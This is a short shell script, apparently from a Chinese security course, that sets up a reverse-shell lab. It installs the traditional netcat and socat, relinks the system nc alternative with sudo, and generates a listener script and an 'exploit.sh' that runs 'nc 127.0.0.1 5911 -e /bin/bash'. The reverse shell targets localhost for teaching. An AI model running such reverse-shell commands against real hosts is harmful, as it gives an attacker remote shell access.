#!/bin/sh
echo "开始部署本章实验环境...";sleep 1
sudo apt install netcat -y
sudo rm /etc/alternatives/nc && sudo ln -s /bin/nc.traditional /etc/alternatives/nc
sudo apt install socat -y
echo "创建 listen.sh...完成"
echo "echo '开始监听本地 5911 端口...'" > listen.sh
echo "nc -lnvp 5911" >> listen.sh
chmod +x listen.sh
echo "创建 exploit.sh...完成"
echo "echo '模拟攻击...'" > exploit.sh
echo "echo 'shell已反弹完成，请查看 listen.sh 所在终端...'" >> exploit.sh
echo "nc 127.0.0.1 5911 -e /bin/bash" >> exploit.sh
chmod +x exploit.sh
echo "--------------------"
echo "初始化完成,祝实验愉快~"
